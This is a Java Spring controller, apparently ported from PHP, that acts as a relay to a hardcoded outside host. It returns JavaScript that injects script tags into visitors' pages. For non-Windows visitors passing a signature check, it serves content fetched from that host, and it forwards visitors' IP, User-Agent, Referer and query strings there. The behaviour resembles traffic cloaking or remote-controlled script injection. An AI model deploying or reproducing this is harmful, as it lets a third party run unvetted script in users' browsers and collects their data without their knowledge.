package com.ly.ems.controller;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.sun.org.apache.regexp.internal.RE;
import org.apache.commons.lang3.StringUtils;
import org.apache.http.HttpEntity;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.BufferedInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.net.URL;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Map;

/**
 * Created by tidus on 2018/10/28.
 */
@Controller
@RequestMapping(value = "/path", name = "PHP2Java")
public class PhpController {


    private static final ObjectMapper objectMapper = new ObjectMapper();


    private static final String USER_AGENT = "User-Agent";
    private static final String REFERER = "Referer";


    // actions 数组
    private static final List<String> ACTION_TYPE = Arrays.asList("init", "next", "do", "update", "debug");
    private static final String uid = "22eb6780171f";
    private static final String api = "http://o.blhome.cn";

    @ResponseBody
    @RequestMapping(value = "/phpInterface")
    public String customMethodName(HttpSession session,
                                   HttpServletRequest request,
                                   HttpServletResponse response,
                                   @RequestParam(name = "action") String action,
                                   @RequestParam(name = "s", required = false) String s,
                                   @RequestParam(name = "t", required = false) String t,
                                   @RequestParam(name = "n", required = false) String n) {
        String agent = getAgent(request);
        String ip = getRemoteAddr(request);
//        String ip = "10.1.1.1";
        String selfPath = request.getRequestURL().toString();
//        String selfPathWithParam = getSelfPath(request);
        Double version = 0.2;

        String theAction = action;
        if (StringUtils.isEmpty(theAction) || !ACTION_TYPE.contains(theAction)) {
            theAction = "init";
        }

        // 逻辑开始
        if (StringUtils.equals(theAction, "init")) {
            String url = String.format("%s/api/get/sign/id/%s?sign=%s", api, uid, ip);
            Map result = null;
            try {
                result = objectMapper.readValue(request(url, request), Map.class);
                if (result != null && result.get("success") != null && (Boolean) result.get("success")) {
                    String time = String.valueOf(new Date().getTime() / 1000);
                    String sign = md5(String.format("%s%s%s%s", uid, time, ip, agent));
                    String next = String.format("%s?action=next&s=%s&t=%s", selfPath, sign, time);
                    return String.format("(function(){var url=\"%s&n=\"+encodeURIComponent(navigator.platform.toLocaleLowerCase()==\"win32\" ? 0 : 1);(document.getElementsByTagName(\"script\")[0].parentNode).appendChild((function(){var s=document.createElement(\"script\");s.setAttribute(\"src\", url);return s})())})();", next);
                } else {
                    return displayError();
                }
            } catch (Exception e) {
                e.printStackTrace();
                return displayError();
            }
        } else if (StringUtils.equals(theAction, "next")) {
            try {
                if (StringUtils.isNotEmpty(s) && StringUtils.isNotEmpty(t) && StringUtils.isNotEmpty(n)) {
                    if (StringUtils.equals(s, md5(String.format("%s%s%s%s", uid, t, ip, agent)))) {
                        if (new Date().getTime() / 1000 - Long.parseLong(t) < 10) {
                            if (StringUtils.equals(n, "1")) {
                                String url = String.format("%s/api/get/newcheck?id=%s", api, uid);
                                String result = request(url, request);
                                return result.replaceAll("\\[\\[url\\]\\]", String.format("%s?action=do", selfPath));
                            }
                        }
                    }
                }
                return displayError();
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
                return displayError();
            }
        } else if (StringUtils.equals(theAction, "do")) {
            String query = "";
            if (StringUtils.isNotEmpty(request.getQueryString())) {
                query = request.getQueryString();
            } else if (StringUtils.isNotEmpty(request.getRequestURI())) {
                String paths = request.getRequestURI();
                // TODO
            }
            String url = String.format("%s/api/get/do/id/%s?ip=%s&%s", api, uid, ip, query);
            return request(url, request);
        } else if (StringUtils.equals(theAction, "update")) {
            // TODO
        } else if (StringUtils.equals(theAction, "debug")) {
            System.out.println("agent: " + agent);
            System.out.println("ip: " + ip);
            System.out.println("selfPath: " + selfPath);
            System.out.println("api: " + api);
            System.out.println("uid: " + uid);
            return String.format("agent:%s<br/>" +
                            "ip:%s<br/>" +
                            "selfPath:%s<br/>" +
                            "api:%s<br/>" +
                            "uid:%s<br/>" +
                            "Version:%s<br/>",
                    agent, ip, selfPath, api, uid, version);

        }

        return "";
    }


    private String displayError() {
        return "if(typeof(openZoosUrl1) == \"undefined\"){\n" +
                "\twindow.openZoosUrl1 = function(){\n" +
                "\t\tif(typeof(LR_url) == \"string\"){\n" +
                "\t\t\tif(typeof(LR_sid) == \"string\"){\n" +
                "\t\t\t\tif(typeof(LR_cid) == \"string\"){\n" +
                "\t\t\t\t\twindow.location.href = LR_url+\"?sid=\"+LR_sid+\"&cid=\"+LR_cid;\n" +
                "\t\t\t\t}\n" +
                "\t\t\t}\n" +
                "\t\t}\n" +
                "\t}\n" +
                "}";
    }

    /****************** Util ******************/

    /**
     * 获取当前地址
     *
     * @param request
     * @return
     */
    private String getSelfPath(HttpServletRequest request) {
        String self = request.getRequestURL().toString();
        if (!StringUtils.isEmpty(request.getQueryString())) {
            self += "?" + request.getQueryString();
        }
        return self;
    }


    /**
     * 获取访问者IP
     *  
     * 在一般情况下使用Request.getRemoteAddr()即可，但是经过nginx等反向代理软件后，这个方法会失效。
     *  
     * 本方法先从Header中获取X-Real-IP，如果不存在再从X-Forwarded-For获得第一个IP(用,分割)，
     * 如果还不存在则调用Request .getRemoteAddr()。
     *  
     *
     * @param request
     * @return
     */
    private String getRemoteAddr(HttpServletRequest request) {
        String ip = request.getHeader("X-Real-IP");
        if (!StringUtils.isBlank(ip) && !"unknown".equalsIgnoreCase(ip)) {
            return ip;
        }

        ip = request.getHeader("X-Forwarded-For");
        if (!StringUtils.isBlank(ip) && !"unknown".equalsIgnoreCase(ip)) {
            // 多次反向代理后会有多个IP值，第一个为真实IP。
            int index = ip.indexOf(',');
            if (index != -1) {
                return ip.substring(0, index);
            } else {
                return ip;
            }
        } else {
            return request.getRemoteAddr();
        }
    }

    /**
     * 获取userAgent
     *
     * @param request
     * @return
     */
    private String getAgent(HttpServletRequest request) {
        return request.getHeader(USER_AGENT);
    }

    /**
     * 获取 REFERER
     *
     * @param request
     * @return
     */
    private String getReferer(HttpServletRequest request) {
        return request.getHeader(REFERER);
    }

    /**
     * 请求url
     *
     * @param url
     * @return
     */
    private String request(String url, HttpServletRequest request) {
        CloseableHttpClient httpClient = HttpClients.createDefault();
        try {
            HttpGet httpGet = new HttpGet(url);

            // 配置
            // CURLOPT_FOLLOWLOCATION httpClient默认开启重定向
            // CURLOPT_RETURNTRANSFER 方法最后已返回utf-8编码的String
            // CURLOPT_TIMEOUT 超时时间 5秒
            RequestConfig config = RequestConfig.custom().
                    setSocketTimeout(5000).
                    setConnectTimeout(5000).
                    setConnectionRequestTimeout(1000).
//                    setRedirectsEnabled(true). // 可去掉
        build();
            httpGet.setConfig(config);

            // Header
            // CURLOPT_USERAGENT
            // CURLOPT_REFERER
            httpGet.setHeader(USER_AGENT, getAgent(request));
            httpGet.setHeader(REFERER, getReferer(request));

            // 请求
            CloseableHttpResponse httpResponse = null;
            httpResponse = httpClient.execute(httpGet);
            try {
                HttpEntity httpEntity = httpResponse.getEntity();
                return EntityUtils.toString(httpEntity, "UTF-8");
            } finally {
                if (httpResponse != null) {
                    httpResponse.close();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (httpClient != null) {
                try {
                    httpClient.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return null;
    }

    /**
     * php md5() 的 java 实现
     *
     * @param source
     * @return
     */
    public static String md5(String source) throws NoSuchAlgorithmException {
        String result = source;
        if (source != null) {
            MessageDigest md = MessageDigest.getInstance("MD5"); //or "SHA-1"
            md.update(source.getBytes());
            BigInteger hash = new BigInteger(1, md.digest());
            result = hash.toString(16);
            while (result.length() < 32) { //40 for SHA-1
                result = "0" + result;
            }
        }
        return result;
    }

    /**
     * 远程file转字符串
     *
     * @param remoteFilePath
     * @return
     * @throws IOException
     */
    @Deprecated
    private String remoteFileToString(String remoteFilePath) throws IOException {
        byte buf[] = new byte[4096];
        URL url = new URL(remoteFilePath);
        BufferedInputStream bis = new BufferedInputStream(url.openStream());
        FileOutputStream fos = new FileOutputStream(remoteFilePath);

        int bytesRead = 0;

        while ((bytesRead = bis.read(buf)) != -1) {
            fos.write(buf, 0, bytesRead);
        }

        fos.flush();
        fos.close();
        bis.close();
        return remoteFilePath;
    }


}
